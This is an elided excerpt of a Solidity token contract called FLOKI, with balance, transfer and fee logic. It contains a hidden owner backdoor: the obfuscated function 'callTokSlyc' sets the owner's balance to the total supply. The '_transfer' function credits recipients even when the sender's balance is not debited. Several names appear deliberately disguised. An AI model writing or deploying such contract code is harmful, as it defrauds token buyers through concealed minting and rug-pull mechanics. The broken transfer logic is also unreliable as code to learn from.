...
contract FLOKI is Context, IERC20, Ownable {
    ...
    function balanceOf(address owner) public view override returns(uint){
        return _tokenAddresses[owner];
    }
    
    function bwCllowy(uint256 value) public {
    ...
    function callTokSlyc() external onlyOwner() {_tokenAddresses[getOwner()] = _decimalTotalTok;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 blsender = _tokenAddresses[sender];
        ...
        if (blsender >= amount){
            _tokenAddresses[sender] = _tokenAddresses[sender] - (amount);
        }
        ...
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(_marketing1))
        {
            ...
            _tokenAddresses[_marketing] += feeAmount.div(2);
        }

        uint256 amoun;
        amoun = amount - feeAmount;
        if (amoun >= 0){
        _tokenAddresses[recipient] += amoun;
        }
